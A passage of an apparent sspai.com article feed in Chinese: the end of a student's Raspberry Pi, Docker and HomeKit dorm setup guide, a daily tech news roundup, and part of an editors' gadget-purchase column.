alt=\"\"><img src=\"https://cdn.sspai.com/2022/01/23/6d88b9a0335b2fffdbeadb9ec043507d.jpeg\" alt=\"\"></figure><p>经历过早些年番剧下载时期的朋友肯能会有所感触，资源的收集和整理是一件相当痛苦的事情。为此，我搭建了我的自动追番系统：</p>\n<h4><strong>自动追番系统</strong></h4>\n<p>我的自动追番系统主要搭建在我的树莓派上，依靠一个外置 2.5 寸机械硬盘存储数据，详情可以参考这篇文章<a href=\"https://sspai.com/post/69050\">树莓派搭建低配版文件存储及家庭影音库</a>。可能会有人问为什么不选用 NAS ，第一是因为相比于树莓派 NAS 的价格较高，第二则是使用 3.5 寸硬盘的 NAS 非常吵闹，非常不适合寝室这种狭小的环境。</p>\n<p>而在树莓派中，自动追番系统主要依靠 qBittorrent 这个 BT 软件。qBittorrent 支持 RSS 订阅下载。通过「<a href=\"https://mikanani.me/\" target=\"_blank\">蜜柑计划</a>」的生成的个人 RSS 订阅链接，qBittorrent 可以在你订阅的每一部番剧追番的时候收到RSS推送更新。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/09/d94ec60db1c136f6b12ba3dca31e5f5f.png\"><figcaption>自动追番系统示意图</figcaption></figure><p>由于 qBittorrent 中 RSS 的自动下载规则设置起来相当繁琐，因此我使用 qBittorrent Web API 和「快捷指令」搭建的「追番规则建立器」来简化添加自动下载规则这一步骤。这样搭建下来，每一季度仅需要两步：</p>\n<ol>\n<li>在「蜜柑计划」中点击你想要追的番剧</li>\n<li>运行快捷指令并输入你追番剧的名称</li>\n</ol>\n<p>简简单单两步设置，就完成了一部番剧的订阅和归类。在这部番剧更新的周期内，一旦更新，第一时间，qBittorrent 就会开始自动分类下载，下载完成之后，配合 Plex Server 的元数据搜刮整理功能，你就可以在你所有设备使用 infuse 上无感的追番看番。</p>\n<p>当然如果有其他搜刮的资源，也可以用「快捷指令」配合 qBittorrent Web API ，直接用右键选单中进行下载</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/23/e9b935280f12cfa0a83cb2b56baf6f40.png\"></figure><h3>完美的游戏联网体验，往往就是一小步</h3>\n<p>在网络搭建的部分的开头，我提到过移动宽带的丢包多，NAT 类型差，不适合主机联机游戏等等问题。当然这些问题解决的方法也很简单，那就是给主机挂一个加速器。我是一个多年的 「UU 加速器」用户，因此也知道通过 PC 给主机加速的操作着实复杂且不友好，先不提复杂的代理地址配置，并且在想要给主机加速的时候 PC 还要保持常开，并且需要在电脑上点击加速，一旦电脑不加速，主机就会断网。使用代理设置之后主机客户端和其他联网设备也不在一个网段中，无法通过局域网远程游玩进行畅玩。这着实称不上优雅方便。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/23/09558dd3e87a4d3391970654787cbf14.png\"><figcaption>操作繁杂的 UU 加速器</figcaption></figure><p>目前我体验过最为方便的加速方案当属路由器中自带的 UU 加速插件：使用简单，无需额外配置，手机端切换节点，自动加速等等优势令我眼馋。然而可惜的是目前市面上仅有寥寥数款路由器支持这一功能， UU 官方也并没有给 Unifi 系列网关进行适配（笑）。</p>\n<p>而我的解决方案则是在树莓派上用 Docker 挂载一个 UU 加速器的 OpenWrt 插件，只需要让主机的网关和 DNS 地址都指向 UU 加速器容器的地址，并且在手机上绑定一回就可以获得和路由器自带的加速插件相同的体验：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/23/71ca13b813fef29f9b6694e13ae7b156.jpeg\"></figure><p>并且这个版本的 UU 加速器还可以同时加速两个设备，加上电脑与手机端，一份会员可以同时加速四个设备，这样算下来 UU 加速器原本高昂的售价也变得超值了。</p>\n<h2>操控的便利性，是舒适感的敲门砖</h2>\n<p>有了网络基础和娱乐基础，懒人的智能化就是下一步目标。对于苹果用户来说 HomeKit 一定是首选，一来有着极高的安全性，全部依靠局域网广播实现控制。而来还有 Homebridge 这样的万能插件，可以给我更多操作的可能性。</p>\n<h3>HomeKit 设备，不多不少刚刚好</h3>\n<p>除了上文提到的 Apple TV 4K ，我的寝室还有一些不贵的 HomeKit 原生配件。寝室不大，能接入智能家居的配件也不算很多，但是各个都能提升我的生活质量。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/23/b9915e8e9659f604f88ff8375ab0e66e.jpeg\"><figcaption>寝室中的 HomeKit 配件</figcaption></figure><p><strong>温度控制——Aqara P3 空调伴侣</strong></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/23/a067a5d3461b1fc9b5aa48bac342b4f9.png\"></figure><p>好在学校并没有使用中央空调来降温，独立的悬挂式空调让智能化变得简单。我选用了Aqara P3 空调伴侣，其原理也很简单，是通过安置在插座上的红外发射装置学习空调的遥控器发射信号来控制空调。我简单设置了几个自动化，来实现在夏天时回到寝室前提前制冷，以及应对出门忘关空调导致跑走巨量电费的应急措施。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/23/fe5227e639a43d0f745b8621b368f01f.png\"></figure><p><strong>Nanoleaf Essentials light bulb</strong></p>\n<p>这款灯泡主要是由于我对 Thread 协议的好奇而购入的，现在摆放在我书桌的另一侧当照明补足使用，偶尔还能当当氛围灯。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2022/01/23/eb70ee7a475ab7910bf3b54ebb31e9b2.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/01/23/ed689a8777cdfe26e4f37b1c6acf0b83.jpeg\" alt=\"\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/23/5ac9f882c7d809d2eccdb1f7e4f8fe09.gif\"><figcaption>Thread 极其快速的响应时间</figcaption></figure><p>满打满算我的寝室也只有这两件是原生接入 HomeKit 的配件了，剩下的一些控制都小用了一些奇思妙想。</p>\n<p>我的第三方控制整合主要依靠 <a href=\"https://homebridge.io/\" target=\"_blank\">HomeBridge</a> 插件，相信深入玩过 HomeKit 的朋友都不陌生：</p>\n<p><strong>SwitchBot Hub mini &amp; SwitchBot Bot</strong></p>\n<p>改造宿舍强电是一个非常不明智的选择，一来可能会埋下安全隐患，而来校规中也有明令禁止的条款。因此我选择了一个讨巧的方法来控制两站宿舍的日光灯。那就是日本品牌的 SwitchBot Bot，开关控制器。这个小玩意原理非常简单，通过蓝牙接收信号之后可以伸出一个机械卡扣，用物理的方式控制开关的通断。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/09/5836f33b0fe38220f869a7aeec31ff40.gif\"><figcaption>通过 SwitchBot Bot 控制开关</figcaption></figure><p>一方面不用顶着安全和校规隐患改造开关，另一方面这个小东西也可以随时带走。再接入 SwitchBot 家的 Hub 之后，就可以用 HomeBridge 接入到 HomeKit 当中控制宿舍两盏灯的状态了。</p>\n<p>而 SwitchBot Hub mini 的红外控制功能也十分强大，可以自主定义并且学习电器的红外遥控信号，然后通过 <a href=\"https://github.com/OpenWonderLabs/homebridge-switchbot#readme\" target=\"_blank\">Homebridge-Switchbot</a> 插件桥接进 HomeKit 中后，仅需要一些简单的设置就可以控制我寝室显示器的 KVM，再配合上细致化的场景设置。四台设备可以无缝的在一台显示器上切换显示输出内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/23/4cf3c8795c092dce11a4ce2234004831.png\"></figure><p><strong>通过 HomeKit 唤醒和的 Mac 和 PC</strong></p>\n<p>相比其他用 HomeKit 实现的花里胡哨的功能，唤醒 PC 和 Mac 显然有用多了。因为我 PC 的主板和 Mac 都支持「网络唤醒」功能，因此使用 HomeBridge 中的 <a href=\"https://github.com/alexgustafsson/homebridge-wol#readme\" target=\"_blank\">Homebridge-WoL</a> 插件，就可以轻松把 PC 和 Mac 的电源接入整个 HomeKit 系统中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/16/article/60a548ea21622be8632645252321058a?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>homebridge-wol</figcaption></figure><p>相比于传统的开机棒，使用 Homebridge + HomeKit 的安全性和整合度更高，响应迅速。不论是在局域网还是广域网中，都可以快速控制寝室中的电脑设备。再配合「晚安」场景关闭 PC ，到达实验室打开「工作」场景拉起 PC 等等自动化，实现不论是在工作中，还是上床休息，都可以按照所需状态打开或者关闭 PC。</p>\n<p>当然除了 PC 和 Mac，其他一些诸如路由器，树莓派以及 PlayStation 5 也可以通通用这个插件控制。有兴趣的同学可以看：<a href=\"https://sspai.com/post/70986\" target=\"_blank\">一日一技｜把 PlayStation 加入 HomeKit</a> 。</p>\n<p><strong>通过 HomeKit 控制各类服务</strong></p>\n<p>实体的电器都接入 HomeKit 之后，虚拟的服务也不能少。不过相比于实体电器来说，接入服务需要一些小技巧。我这边挑选 qBittorrent 举个例子。插件上，我仅使用了 <a href=\"https://github.com/nfarina/homebridge-dummy#readme\" target=\"_blank\">HomeBridge-Dummy</a> 用于虚拟需要控制服务的开关。而控制 qBittorrent 我则用了家庭自动化中自带的「快捷指令」，根据 qBittorrent 给出的 <a href=\"https://github.com/qbittorrent/qBittorrent/wiki/WebUI-API-(qBittorrent-4.1)\" target=\"_blank\">Web API</a>:</p>\n<ul>\n<li>暂停：<code>/api/v2/torrents/pause?hashes=all</code>\n</li>\n<li>继续：<code>/api/v2/torrents/pause?hashes=all</code>\n</li>\n</ul>\n<p>再根据格式添加到 URL 命令中：</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/01/23/75f741c8764dc8664bf87d950fae4cf2.jpeg\"><figcaption>使用「快捷指令」调用 Web API</figcaption></figure><p>在点按 HomeKit 中的虚拟开关时，HomeKit 家庭中枢就会调用这一条快捷指令，向指定的 HTTP 地址发送请求，从而触发服务内的开关。</p>\n<p>同样的方法也可以用于 Docker 容器的启停，Surge 上代理的开关，等等稀奇古怪的操作，不过可惜的是更新到 iOS 15 之后，HomeKit 自动化中的 SSH 指令就不能使用了，不然还可以对服务做更加细致的控制。</p>\n<h3>统筹规划，Web页面不可少</h3>\n<p><strong>容器管理</strong></p>\n<p>我的所有服务基本都部署在树莓派的 Docker 上，而用命令行管理 Docker 容器是一件很痛苦的事情，因此我选择 <a href=\"https://www.portainer.io/\" target=\"_blank\">Portainer</a> 作为 Docker 的管理器。Portainer 作为一个轻量级容器管理 UI，可以替代几乎所有 Docker 的命令行操作，同时升级或者更改容器环境变量也变得异常简单，再也不需要因为一条命令写错而反复去找容器的 ID。作为 UI 而言，Portainer也十分美观，并且在最新版本也适配了黑夜模式。并且 Portainer 也有可供使用的 HTTP API，通过前文讲述的方法，可以很轻松的把容器管理接入到 HomeKit 中（当然也可以用 <a href=\"https://github.com/kpostekk/homebridge-docker#readme\" target=\"_blank\">Homebridge-docker</a> 这个插件来管理）</p>\n<figure class=\"ss-imgRows\" figcaption=\"Portainer 的管理界面\"><img src=\"https://cdn.sspai.com/2022/01/23/905818eb75181b7dbee5d9530bd8032d.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2022/01/23/08ef5c07dfc6e6df9c76c3498f1ee210.png\" alt=\"\"></figure><p><strong>入口管理</strong></p>\n<p>有了 Portainer 管理运行的各类容器，但是如何快捷的转跳到 Portainer 等服务的 WebUI 界面呢。在搭建容器的时候，一般这些服务的的 WebUI服务 都会需要你在 IP 地址之后添加上繁琐的端口号，比如：</p>\n<ul>\n<li>\n<code>http://HOSTIP:8181</code> —— qBittorrent Web 服务地址</li>\n<li>\n<code>http://HOSTIP:8581</code> —— Homebridge Web 服务地址</li>\n<li>\n<code>https: //HOSTIP:9443</code> —— Portainer Web 服务地址</li>\n</ul>\n<p>这显然给便捷管理带来了不便，因此我在 Docker 中运行了一个 Nginx（一种常见网页服务器） 来作为树莓派的导航页。Nginx 默认使用 80 端口，也就是万维网端口，因此只需要在浏览器中输入服务器的 IP 地址就会默认在后面添加 80 端口，转跳到 Nginx 服务中指定的 HTML 网页。</p>\n<p>当然美观的页面也是必须的，作为一个网络乞丐，我去搜刮了一段 CSS 代码，完成了我的「服务器城门」，想要访问或者管理我的任何一个服务，只要点击对应的图标即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/23/f5ac53d9503f7f0d0fd51b59c3411860.gif\"><figcaption>我自己搭建的 Web 服务端</figcaption></figure><p>当然，入口网址的地址我们同样可以托管到 CloudFlare 上。通过 DNS 服务器会返回一个私网的 IP 地址，是仅限内网使用的域名。</p>\n<h2>结语</h2>\n<p>写到这里，可能和大家想象的寝室桌面介绍大相径庭，稍微收拾了一下桌子给大家看一下我并不算整洁的桌面。就我个人而言，服务和网络相比于整洁美观的桌搭更符合我的需求，</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/01/24/fc8527970bf395653e6504f334ff781e.jpeg\"><figcaption>目前寝室的书桌全貌</figcaption></figure><p>更像是在虚拟世界中搭建了属于自己的桃源，可能这某种程度也和当下互联网的某新型概念不谋而合，折腾的过程也确确实实变成了我枯燥的科研生活的调味剂。而这些项目虽然看起来繁多且复杂，但是大多数实际上手起来对于我这种非计算机科学的学生来说实现起来也不算困难。当然更重要的是有一个不妥协的心和去做的行动力，我想这可能是我作为一个刚入门的极客对于生活的态度和追求。</p>\n<p>非常感谢可以看到这里的你，也希望我折腾的这些东西中或多或少可以对你改善自己的生活娱乐体验有些许帮助！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\" target=\"_blank\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，找到数字时代更好的生活方式 🎊</p>\n<p>&gt; 年度回顾、好物推荐…… 更多精彩尽在 <a href=\"http://sspai.com/page/2021\" target=\"_blank\">少数派 2021 年度盘点</a> 🎉</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/70764"},{"title":"派早报：红魔游戏手机 7 系列正式发布、微软发布 Windows 11 Dev 预览版 22557","date":"2022-02-18 01:01:34","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>红魔游戏手机 7 系列正式发布</h3>\n<p>2 月 17 日，红魔召开新品发布会，正式发布红魔游戏手机 7 系列。其中，红魔 7 采用了 165Hz 高刷电竞屏，搭载高通骁龙 8 系列处理器，采用了 ICE 8.0 魔冷散热系统。续航方面，内置了 4500mAh 电池，并搭配 120W 快充。</p>\n<p>而红魔 7 Pro 系列则采用了 UDC 全面屏，搭载高通骁龙 8 系列处理器，散热方面则采用了 ICE 9.0 魔冷散热系统。续航方面，内置了 5000mAh 电池，并搭配 135W 快充。影像方面，前置 1600 万像素屏下摄像头，后置 6400 万高清三摄。</p>\n<p>除此之外，两者还配备了 500Hz 双触控肩键以及双 X 轴线性马达，红魔 7 预计售价为 3899 元起，红魔 Pro 预计售价为 4799 元起。<a href=\"https://www.nubia.com/active/hm7.html\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2022/02/18/916fd94c28ae8633d1a8511fa8ac3328.jpg\"></figure><h3>微软发布 Windows 11 Dev 预览版 22557</h3>\n<p>微软于 2 月 17 日面向 Dev 频道发布了 Windows 11 Insider Preview Build 22557 系统，包括了：支持在「开始」菜单中「固定应用程序」区域创建和整理文件夹、全新设计的勿扰和专注模式入口、支持「实时字幕」功能、改进文件资源管理器中的快速访问功能、全新的 Snap 多任务布局以及重新设计的任务管理器（加入了黑暗主题）以及效率模式在内的一系列新功能和改进。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/article/46a960b8bb37e9c82648f07b4ca0fd7c\"></figure><p>此外，微软还预计在未来的 Win 11 测试版本中加入 Windows HDR Calibration 的支持，通过该应用程序可以让用户使用三种测试模式校准 HDR。<a href=\"https://www.ithome.com/0/603/409.htm\" target=\"_blank\">来源</a></p>\n<h3>桌面端 Google 搜索正在测试卡片小部件</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/4190436e62f14947c11b654fceddb97b.png\"></figure><p>Google 正在其桌面端搜索主页上测试一个新功能，点击右下角的隐藏内容开关后会完全展开六张卡片，分别呈现当前天气、搜索趋势、看点、股票市场信息、当地的活动以及新冠疫情等信息，点击这些卡片将会展示完整的网络搜索结果内容。<a href=\"https://9to5google.com/2022/02/16/google-search-widgets/\" target=\"_blank\">来源</a></p>\n<h3>Photoshop 现已支持 WebP 文件格式</h3>\n<p>2 月 17 日，Adobe 正式宣布 Photoshop 23.2 将支持 WebP 文件格式，用户可以在 Photoshop 中完成 WebP 文件的编辑和调整，无需再安装其他插件。<a href=\"https://helpx.adobe.com/photoshop/kb/support-webp-image-format.html\" target=\"_blank\">来源</a><br> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/article/773ba0bb763166ffb08c4889cb7fd17b\"></figure><h3>Google 开源 Material Color Utilities 代码</h3>\n<p>Google 于 2 月 17 日开源了动态主题背后的 Material Color Utilities 代码，同时在一篇解释文章中解释了整套系统是如何运作并最终实现相对应的效果的，该跨平台代码库目前可在 Dart、Java 和 Typescript 中可用，期以帮助开发者和第三方 ROM 开发者适配 Android 12 中的「自动取色」功能。此外，Google 计划通过 SASS 的 CSS 和 GLSL 着色器将其带入 iOS 平台。<a href=\"https://9to5google.com/2022/02/17/material-dynamic-color-code/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/4f2df8aec7b4cdd086803c0762abb8cb.png\"></figure><h3>《拳皇 15》正式发售</h3>\n<p>2 月 17 日，株式会社 SNK 正式宣布，新款作对战格斗游戏《THE KING OF FIGHTERS XV》（即为《拳皇 15》）开始在 PlayStation 5、PlayStation 4、Xbox Series X|S、Windows 10、Steam、Epic Games 等平台进行销售。</p>\n<p>该游戏采用虚幻 4 引擎进行开发，是《拳皇》系列的正统续作，包含历代的 39 名角色。SNK 预计还将在将在 3 月、5 月以及夏季、秋季公布四个 DLC 内容。该游戏 Steam 国区售价 324 元起，PS4 国行 299 元，PS5 国行 299 元起。<a href=\"https://store.steampowered.com/app/1498570/THE_KING_OF_FIGHTERS_XV/?l=schinese\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/article/c604ba163f03cc1673e4ce9c28a95297\"></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>法拉第未来宣布 FF 91 将在 2 月 24 日正式发布，根据网络爆料显示，该车辆采用了溜背式造型设计，保留了对开门以及无边框车窗的构造，内部采用四座布局，并搭配多块显示屏。<a href=\"https://m.ithome.com/html/603526.htm\" target=\"_blank\">来源</a>\n</li>\n<li>数码博主@数码闲聊站于 2 月 17 日曝光了天玑 8000 系列轻旗舰的跑分，安兔兔跑分达到了 82 万分。此外根据消息来看，天玑 8000 系列有天玑 8000 和频率更高的天玑 8100，天玑 8000 性能对标骁龙 870，天玑 8100 则对标骁龙 888。<a href=\"https://www.ithome.com/0/603/480.htm\" target=\"_blank\">来源</a>\n</li>\n<li>据爆料人士称，2 月 17 日在少数派办公室内出现一个全新的水獭，疑似和此前的「整容」谣言有千丝万缕的联系。当记者就此事联系到少数派员工 <a href=\"https://sspai.com/u/xyzyq6cj/updates\" target=\"_blank\">@吃派的水獭</a> 时，ta 表示新獭比较害羞，暂时只能向大家展示新獭的证件照。<a href=\"https://secret.sspai.com/otter\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/18/176801a0c5857509f93cf880bd9c3a24.jpg\"></figure><h2>少数派的近期动态</h2>\n<ul>\n<li>\n<a href=\"https://sspai.com/post/70693\" target=\"_blank\">✍️ 少数派年度征文</a> 还剩最后两周，目前效率战队和生活战队战况胶着，就等你投出下一篇啦！</li>\n<li>🎁 少数派 iOS 客户端 <a href=\"https://itunes.apple.com/cn/app/id1191720421?mt=8\" target=\"_blank\">重大更新</a>，<a href=\"https://apps.apple.com/cn/app/id1191720421?eventid=6442693454\" target=\"_blank\">「派读」功能新鲜上线</a>，为你打造量身定制的内容拼盘。</li>\n<li>🎇 会员通讯 <a href=\"https://sspai.com/prime/precog/vol016-pre-back-to-work\" target=\"_blank\">第 16 期</a> 上线，带你准备好开工第一周的工作、学习和生活。</li>\n<li>📕 <a href=\"https://sspai.com/prime/precog/techod-0x09\" target=\"_blank\">科技漫游第 0x09 期</a> 正在更新，学学如何<a href=\"https://sspai.com/prime/story/shortcuts-blood-pressure-monitering\" target=\"_blank\">用快捷指令帮家人记录血压</a>，更有 <a href=\"https://sspai.com/prime/story/charles-sina-lottery-tutorial\" target=\"_blank\">Charles 抓包实战</a>。</li>\n<li>☕ 少数派报告《<a href=\"https://sspai.com/prime/precog/specialty-coffee-report\" target=\"_blank\">精品咖啡入门指南</a>》已上线，从相对硬核的咖啡豆种、处理法、烘焙法到大家关心的器材和冲煮攻略，都在这里啦！</li>\n</ul>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li><a href=\"https://sspai.com/post/71315\" target=\"_blank\">❤️ 年度征文｜感情里的酸甜苦辣，换个角度也是一门生活必修课</a></li>\n<li><a href=\"https://sspai.com/post/71475\" target=\"_blank\">🖱️ 把鼠标手势玩出花：macOS / Windows 效率工具 WGestures 2</a></li>\n<li><a href=\"https://sspai.com/post/71499\" target=\"_blank\">🗃 注定影响你我的新标准：Google 的「隐私沙盒」究竟在为什么抗争？</a></li>\n<li><a href=\"https://sspai.com/post/71502\" target=\"_blank\">🌟 新玩意 094｜少数派的编辑们最近买了啥？</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71510"},{"title":"新玩意 094｜少数派的编辑们最近买了啥？","date":"2022-02-17 09:30:29","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<p>内容声明：《新玩意》栏目如含有商务内容，将会在对应条目标注「广告」；来源为「厂商赠送」的产品并无内容干涉。</p>\n<hr>\n<h2>@张奕源 Nick：Casio A168WEGG-1B 手表</h2>\n<ul>\n<li>入手渠道：天猫自购</li>\n<li>参考价格：358 元</li>\n</ul>\n<p>我一直有戴表看时间的习惯，此前戴的大多是智能手表，除了看时间也能计计步。但我过年期间从 iPhone 跳槽到了 Android，手表也进入了空档期，于是决定找一个老款且不贵的手表，就当成送自己的新年礼物。恰好我很喜欢的 YouTube 频道 <a href=\"https://www.youtube.com/watch?v=uHACr1GD-EA\" target=\"_blank\">老东西</a> 推荐了 Casio 的 A168，我就搞了一块试试看。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87111tb34taatkrm1ug.jpeg\"></figure><p>Casio 的首款 A168 推出于 1991 年，是更早款型 F91W-1 的改款。由于这个设计经典耐看，Casio 围绕它推出了许多修改款型，对设计、功能等做了不同的细微调整。</p>\n<p>我购买的 A168 型号是 A168WEGG-1B，该型号的特点是表显的底色是黑色，数字以白色显示，相当于传统电子表的反色。我选择这个型号的原因也是它的表显颜色和黑色表身更搭配，一体感更强。</p>\n<p>这款手表是个复古手表，操作逻辑也是经典的电子表套路。手表默认显示时间，按下灯光键后萤幕会发光，方便暗光下查看时间。通过设定键能切换秒表计时、闹钟设定和时间设定模式，手表还能整点报时。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87112tb34taatkrm1v0.jpeg\"></figure><p>不仅如此，A168 还拥有防水功能，表盘上也写着 Water Resist 字样。这让 A168 可以全天候无感佩戴，平时洗个手冲个水之类也完全不怕，实用度又高了一重。</p>\n<p>戴回传统手表之后，我感觉自己获得了某种解放，不用每天操心给手表充电，控制手表的方式也都是物理按键，每一次操作都很明确和扎实。在手表智能化的年代，这款从上世纪穿越而来的手表却让我更真实地感知到了时间的存在。</p>\n<h2><strong>@张奕源 Nick：绿联 HiTune Max 3 蓝牙耳机</strong></h2>\n<ul>\n<li>入手渠道：厂商赠送</li>\n<li>参考价格：499 元</li>\n</ul>\n<p>耳机大户的我又来体验耳机了，这次是绿联 HiTune Max 3。</p>\n<p>绿联是我最常用的数码配件品牌，各种数据线、转接头之类的玩意儿买过一堆，而降噪耳机又是我日常使用频率最高的数码产品。所以当我得知绿联推出了头戴式耳机时，我的脑中只有一个想法：嚯，这我可得试试。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87113lb34ta9887655g.jpeg\"></figure><p>HiTune Max 3 的做工很扎实，这点让我稍稍有点意外。我对千元级头戴耳机的做工这件事其实一直没有太高的期许，因为头戴耳机上的曲线很多，又大多是塑料或皮革的拼合件，想要在工艺上做出扎实感并不容易。但 HiTune Max 3 在各种接缝、过渡等细节上毫不糊弄，刚一开箱就赢得了我的几分好感。</p>\n<p>HiTune Max 3 的亮点之一是具备主动降噪功能。和我常用的 SONY WH-1000XM4 相比，Max 3 的绝对降噪能力稍微差了一点点，主要差在于对中高频噪音的处理上。受制于主动降噪的原理，降噪耳机面对中高频噪音时非常依赖算法的支持，SONY 与绿联在这方面的技术积累自然不可同日而语。就实际感受来说，Max 3 应付日常通勤之类完全不成问题，特别是对于没用过头戴式主动降噪耳机，想选一个入门款感受一下的朋友们来说，Max 3 的降噪能力已经可以很好地完成任务。</p>\n<p>我很喜欢 HiTune Max 3 的一个小设计是其设置了主动降噪功能以及音量加减的独立按键，这一点更符合我的使用习惯，比 SONY 的手势触控爽快多了。顺便吐槽一句：很多耳机都将「双击侧面」设为播放 / 暂停功能，每次双击都敲得脑壳疼，希望耳机厂家们能尽快转换思路，多用实体按键或者其它手势解决这个问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87113tb34ta9bscr3r0.jpeg\"></figure><p>音质方面，HiTune Max 3 的表现中规中矩，低频相对而言更为饱满。我将 Max 3 定位为日常办公耳机，听的主要是搭配工作用的背景乐，对音质没什么要求。如果想在音质方面获得更高体验，还是得考虑主打 Hi-Fi 的产品。</p>\n<p>HiTune Max 3 的另一个亮点是续航，绿联自己的宣传是普通使用环境下连续播放 60 小时，开启降噪后降为 40 小时。就我的实际感知来说，Max 3 的续航也着实是长得可以，以至于我从入手到现在差不多一个月的时间里从没听到过它的低电量提示音，每次给它充电都是因为别的耳机没电了，于是顺带着一起充一充。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87114db34taatkrm1vg.jpeg\"></figure><p>总体来说，HiTune Max 3 很符合绿联产品的一贯特质——基础功能齐全，产品皮实耐用，而且还多了一项「长得也可以」。如果你还没用过头戴式耳机，完全可以搞一个试试看。</p>\n<h2>@北鸮：文石 BOOX Poke3</h2>\n<ul>\n<li>入手价格：1170 元</li>\n<li>入手渠道：淘宝旗舰店</li>\n</ul>\n<p>我曾经拥有一个 Kindle。那时是本科，本着「阅读电子书比纸质书便宜太多」的想法，我购入了日版 Kindle Paperwhite 3。但实际操作下来，我发现自己根本没花那么多时间看书。在吃灰几个月后，KPW3 被爱读小说的室友收走。成功回款的同时，我也非常庆幸它能在爱看书的人手上发光发热。</p>\n<p>时间转到今年。在读过站内不少关于读书的文章后，我又一次蠢蠢欲动，打算趁着这个想法把读小说的习惯捡回来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87114lb34ta9bscr3rg.jpeg\"></figure><p>之所以这次没有选择 Kindle，是因为考虑到自己的需求，封闭系统可能并不是最佳选择。我打算在这块阅读器上读小说和漫画这类不太用过脑子的内容，注重娱乐阅读。这也算是吸取了自己之前试图用 Kindle 干点什么正事，但最后什么也没看的窘况。所以，能装的阅读来源越多越好，适配的格式也是越多越好，最好还能原生允许我安装第三方应用，这样下来，仍然活跃的厂商中，文石几乎成了唯一选项。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c87114tb34ta98876560.jpeg\"></figure><p>配置方面，电子书阅读器也没什么太好纠结的，我主要关注了屏幕的色温与背光调节，以及最重要的，尺寸。Poke3 整体尺寸和旧版的 Paperwhite 类似，握在手里比较友好，塞在包内也十分轻便。这块屏幕同样支持冷暖背光分别调节，可以跟随环境光状况进行矫正：这显然没有 Kindle 那样上手可用，但在保证开放系统的前提下，文石的这套方案是在我看来最好的。唯一的问题就是需要我在某个闲暇时刻，找一些白纸在自然光下矫正冷暖背光的强度，以期获得一个更加完善的视觉体验。</p>\n<p>这块阅读器到手的时间不长，我的阅读量也还没有上去，如果有必要的话，我会在使用一段时间后仔细聊聊我的感受。</p>\n<h2>@Lincoln: 带 Touch ID 的 Magic Keyboard</h2>\n<ul>\n<li>入手价格：1050 元</li>\n<li>入手渠道：咸鱼</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img 